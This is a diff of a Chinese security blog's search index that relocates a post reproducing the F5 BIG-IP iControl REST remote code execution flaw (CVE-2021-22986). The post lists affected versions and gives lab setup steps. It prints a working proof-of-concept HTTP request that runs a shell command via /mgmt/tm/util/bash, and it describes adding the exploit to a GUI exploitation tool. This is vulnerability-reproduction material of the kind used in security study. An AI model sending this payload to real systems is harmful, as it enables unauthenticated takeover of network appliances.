-<p>所以在配置用户权限时，可以将拥有Debug权限的本地管理员从Administrator组中移除。重启系统之后，在运行mimikatz，在第一步”privilege::debug”时就会报错了。</p>
-]]></content>
-      <categories>
-        <category>域渗透</category>
-      </categories>
-      <tags>
-        <tag>Windows提权</tag>
-        <tag>域渗透</tag>
       </tags>
   </entry>
   <entry>
@@ -1969,63 +1969,6 @@
 
 <p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210318204258.png" alt="image-20210318204216768"></p>
 <h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg3NDU2MTg0Ng==&mid=2247484117&idx=1&sn=2fdab8cbe4b873f8dd8abb35d935d186&chksm=cecfaa8cf9b8239acbc83c363af62c41602cb167c485acc23a9850980044487585e6c408f632&scene=132#wechat_redirect">Apache Solr 任意文件读取漏洞 1Day</a></p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>漏洞复现</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>漏洞复现-F5 BIG-IP远程代码执行漏洞(CVE-2021-22986)</title>
-    <url>/2021/04/04/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-F5%20BIG-IP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2021-22986)/</url>
-    <content><![CDATA[<blockquote>
-<p>  燕子来时新社，梨花落后清明。</p>
-</blockquote>
-<h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>F5 BIG-IP 是美国 F5 公司的一款集成了网络流量管理、应用程序安全管理、负载均衡等功能的应用交付平台。</p>
-<p>CVE-2021-22986 该漏洞允许未经身份验证的攻击者通过BIG-IP管理界面和自身IP地址对iControl REST接口进行网络访问，以执行任意系统命令，创建或删除文件以及禁用服务。</p>
-<h2 id="0x02-漏洞影响"><a href="#0x02-漏洞影响" class="headerlink" title="0x02 漏洞影响"></a>0x02 漏洞影响</h2><table>
-<thead>
-<tr>
-<th align="center">F5 BIG-IP 16.0.0-16.0.1</th>
-<th>F5 BIG-IP 12.1.0-12.1.5.2</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">F5 BIG-IP 15.1.0-15.1.2</td>
-<td>F5 BIG-IQ 7.1.0-7.1.0.2</td>
-</tr>
-<tr>
-<td align="center">F5 BIG-IP 14.1.0-14.1.3.1</td>
-<td>F5 BIG-IQ 7.0.0-7.0.0.1</td>
-</tr>
-<tr>
-<td align="center">F5 BIG-IP 13.1.0-13.1.3.5</td>
-<td>F5 BIG-IQ 6.0.0-6.1.0</td>
-</tr>
-</tbody></table>
-<h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h2><p><a href="https://login.f5.com/resource/registerEmail.do">https://login.f5.com/resource/registerEmail.do</a> 注册好后，下载</p>
-<p><a href="https://downloads.f5.com/esd/eula.sv?sw=BIG-IP&pro=big-ip_v16.x&ver=16.0.1&container=16.0.1_Virtual-Edition&path=&file=&B1=I+Accept">https://downloads.f5.com/esd/eula.sv?sw=BIG-IP&amp;pro=big-ip_v16.x&amp;ver=16.0.1&amp;container=16.0.1_Virtual-Edition&amp;path=&amp;file=&amp;B1=I+Accept</a>  选择ova格式的，可以快速使用vm虚拟机打开，安装完后，用户名：root，密码：default，成功登陆后，输入config输入config ，几次回车即可看到当前ip，访问</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404144019.png" alt="image-20210404113304697"></p>
-<h4 id="3-1-使用POC攻击"><a href="#3-1-使用POC攻击" class="headerlink" title="3.1 使用POC攻击"></a>3.1 使用POC攻击</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /mgmt/tm/util/bash HTTP/1.1</span><br><span class="line">Content-Type: application/json</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Authorization: Basic YWRtaW46QVNhc1M=</span><br><span class="line">X-F5-Auth-Token: </span><br><span class="line">Host: 192.168.1.191</span><br><span class="line">Content-Length: 39</span><br><span class="line"></span><br><span class="line">&#123;&quot;command&quot;:&quot;run&quot;,&quot;utilCmdArgs&quot;:&quot;-c id&quot;&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404144015.png" alt="image-20210404111524871"></p>
-<h2 id="0x04-利用工具编写"><a href="#0x04-利用工具编写" class="headerlink" title="0x04 利用工具编写"></a>0x04 利用工具编写</h2><p>直接使用上次的<a href="http://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247483987&idx=1&sn=2ee31ccbf8588c23e4184fcd3ab251f8&chksm=c2829b4af5f5125c563e437263eec4ebac08f32f2ace3e4bed9f5c8e562bac5299260b847c27#rd">图形化漏洞利用工具</a>编写</p>
-<blockquote>
-<p>图形化漏洞利用工具已更新</p>
-<p>项目地址：<a href="https://github.com/yhy0/ExpDemo-JavaFX">https://github.com/yhy0/ExpDemo-JavaFX</a></p>
-<p>V1.1 </p>
-<p>​	参考冰蝎的代理，添加代理设置，方便走burp调试</p>
-<p>​	优化批量检查逻辑，使用接口，这样每次添加新的漏洞利用时，就不需要修改批量检查的逻辑。</p>
-</blockquote>
-<p>在<code>src/main/java/com/yhy/core</code>下新建<code>CVE_2021_22986</code>类，实现<code>ExploitInterface</code>接口，并实现里面的函数，具体填充，直接将项目中的示例<code>CVE_2020_14882</code> 的内容复制过去，修改一下内容，填充payload即可</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404144011.png" alt="image-20210404113814410"></p>
-<p>写完后，进入<code>src/main/java/com/yhy/core/Constants.java</code> 和 <code>src/main/java/com/yhy/tools/Tools.java</code>修改</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404144002.png" alt="image-20210404132413838"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404144006.png" alt="image-20210404132702066"></p>
-<p>运行即可。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404143957.gif" alt="CVE-2021-22986"></p>
 ]]></content>
       <categories>
         <category>漏洞复现</category>
@@ -2251,6 +2194,63 @@
       <tags>
         <tag>内网渗透</tag>
         <tag>docker逃逸</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>漏洞复现-F5 BIG-IP远程代码执行漏洞(CVE-2021-22986)</title>
+    <url>/2021/04/04/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-F5%20BIG-IP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2021-22986)/</url>
+    <content><![CDATA[<blockquote>
+<p>  燕子来时新社，梨花落后清明。</p>
+</blockquote>
+<h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>F5 BIG-IP 是美国 F5 公司的一款集成了网络流量管理、应用程序安全管理、负载均衡等功能的应用交付平台。</p>
+<p>CVE-2021-22986 该漏洞允许未经身份验证的攻击者通过BIG-IP管理界面和自身IP地址对iControl REST接口进行网络访问，以执行任意系统命令，创建或删除文件以及禁用服务。</p>
+<h2 id="0x02-漏洞影响"><a href="#0x02-漏洞影响" class="headerlink" title="0x02 漏洞影响"></a>0x02 漏洞影响</h2><table>
+<thead>
+<tr>
+<th align="center">F5 BIG-IP 16.0.0-16.0.1</th>
+<th>F5 BIG-IP 12.1.0-12.1.5.2</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">F5 BIG-IP 15.1.0-15.1.2</td>
+<td>F5 BIG-IQ 7.1.0-7.1.0.2</td>
+</tr>
+<tr>
+<td align="center">F5 BIG-IP 14.1.0-14.1.3.1</td>
+<td>F5 BIG-IQ 7.0.0-7.0.0.1</td>
+</tr>
+<tr>
+<td align="center">F5 BIG-IP 13.1.0-13.1.3.5</td>
+<td>F5 BIG-IQ 6.0.0-6.1.0</td>
+</tr>
+</tbody></table>
+<h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h2><p><a href="https://login.f5.com/resource/registerEmail.do">https://login.f5.com/resource/registerEmail.do</a> 注册好后，下载</p>
+<p><a href="https://downloads.f5.com/esd/eula.sv?sw=BIG-IP&pro=big-ip_v16.x&ver=16.0.1&container=16.0.1_Virtual-Edition&path=&file=&B1=I+Accept">https://downloads.f5.com/esd/eula.sv?sw=BIG-IP&amp;pro=big-ip_v16.x&amp;ver=16.0.1&amp;container=16.0.1_Virtual-Edition&amp;path=&amp;file=&amp;B1=I+Accept</a>  选择ova格式的，可以快速使用vm虚拟机打开，安装完后，用户名：root，密码：default，成功登陆后，输入config输入config ，几次回车即可看到当前ip，访问</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404144019.png" alt="image-20210404113304697"></p>
+<h4 id="3-1-使用POC攻击"><a href="#3-1-使用POC攻击" class="headerlink" title="3.1 使用POC攻击"></a>3.1 使用POC攻击</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /mgmt/tm/util/bash HTTP/1.1</span><br><span class="line">Content-Type: application/json</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Authorization: Basic YWRtaW46QVNhc1M=</span><br><span class="line">X-F5-Auth-Token: </span><br><span class="line">Host: 192.168.1.191</span><br><span class="line">Content-Length: 39</span><br><span class="line"></span><br><span class="line">&#123;&quot;command&quot;:&quot;run&quot;,&quot;utilCmdArgs&quot;:&quot;-c id&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404144015.png" alt="image-20210404111524871"></p>
+<h2 id="0x04-利用工具编写"><a href="#0x04-利用工具编写" class="headerlink" title="0x04 利用工具编写"></a>0x04 利用工具编写</h2><p>直接使用上次的<a href="http://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247483987&idx=1&sn=2ee31ccbf8588c23e4184fcd3ab251f8&chksm=c2829b4af5f5125c563e437263eec4ebac08f32f2ace3e4bed9f5c8e562bac5299260b847c27#rd">图形化漏洞利用工具</a>编写</p>
+<blockquote>
+<p>图形化漏洞利用工具已更新</p>
+<p>项目地址：<a href="https://github.com/yhy0/ExpDemo-JavaFX">https://github.com/yhy0/ExpDemo-JavaFX</a></p>
+<p>V1.1 </p>
+<p>​	参考冰蝎的代理，添加代理设置，方便走burp调试</p>
+<p>​	优化批量检查逻辑，使用接口，这样每次添加新的漏洞利用时，就不需要修改批量检查的逻辑。</p>
+</blockquote>
+<p>在<code>src/main/java/com/yhy/core</code>下新建<code>CVE_2021_22986</code>类，实现<code>ExploitInterface</code>接口，并实现里面的函数，具体填充，直接将项目中的示例<code>CVE_2020_14882</code> 的内容复制过去，修改一下内容，填充payload即可</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404144011.png" alt="image-20210404113814410"></p>
+<p>写完后，进入<code>src/main/java/com/yhy/core/Constants.java</code> 和 <code>src/main/java/com/yhy/tools/Tools.java</code>修改</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404144002.png" alt="image-20210404132413838"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404144006.png" alt="image-20210404132702066"></p>
+<p>运行即可。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404143957.gif" alt="CVE-2021-22986"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>漏洞复现</tag>
       </tags>
   </entry>
   <entry>
